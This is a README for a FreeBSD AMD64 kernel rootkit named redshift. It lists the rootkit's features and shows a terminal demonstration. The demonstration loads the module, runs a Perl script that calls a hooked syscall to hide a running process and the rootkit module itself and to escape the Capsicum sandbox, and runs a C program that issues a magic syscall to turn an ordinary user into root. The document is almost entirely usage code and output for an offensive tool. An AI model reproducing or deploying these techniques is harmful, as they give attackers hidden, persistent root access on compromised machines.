redshift - FreeBSD rootkit

This is a small rootkit for FreeBSD AMD64. It has been tested on FreeBSD 10.0-RELEASE AMD64.

Features:

	Hide a process
	Hide a module
	Escalate the privileges to root
	Escape the Capsicum sandbox


Demonstration:

```
$ su
Password:
root@rootkit:/usr/home/andersonc0d3 # kldload rootkit_amd64/rk.ko
root@rootkit:/usr/home/andersonc0d3 # exit
$ cd rootkit_amd64
$ cat hideme.c
int main(void){
	while(1);
	return 0;
}
$ ./hideme &
$ echo $!
985
$ ps -p 985
PID TT  STAT    TIME COMMAND
985  0  R    0:06.57 ./hideme
$ kldstat
Id Refs Address            Size     Name
 1    6 0xffffffff80200000 16314c0  kernel
 2    1 0xffffffff81a12000 2a53     uhid.ko
 3    1 0xffffffff81a15000 4b0      rk.ko
$ cat exec.pl
#!/usr/bin/perl

use strict;
use warnings;

my $a="rk";
my $b="./hideme";
my $capsicum_process_pid="999"

# syscall(210,1)  # call the syscall to hook the interrupt handler
#
# syscall (210,0) # call the syscall to restore the original interrupt handler
#
# call syscall to hide a module
#

syscall(210,3,$a);

# call syscall to hide a process
#
#

syscall(210,4,$b);

# call syscall to escape a PID XYZ to Capsicum sandbox
#
#

syscall(210,5,NULL,$capsicum_process_pid);
$ perl exec.pl
$ ps -p 985
PID TT  STAT TIME COMMAND
$ kldstat
Id Refs Address            Size     Name
 1    6 0xffffffff80200000 16314c0  kernel
 2    1 0xffffffff81a12000 2a53     uhid.ko
$ id
uid=1001(andersonc0d3) gid=1001(andersonc0d3) groups=1001(andersonc0d3),0(wheel)
$ cat getroot.c
#include <stdio.h>
#include <stdlib.h>

int main(void){
	
	asm("mov $0x31337,%rax");
	asm("syscall");

	return 0;
}
$ ./getroot
$ id
uid=0(root) gid=0(wheel) groups=0(wheel)
$ su
root@capsicum:/usr/home/andersonc0d3/rootkit_amd64 # kldunload rk
kldunload: can't find file rk
root@capsicum:/usr/home/andersonc0d3/rootkit_amd64 #
```
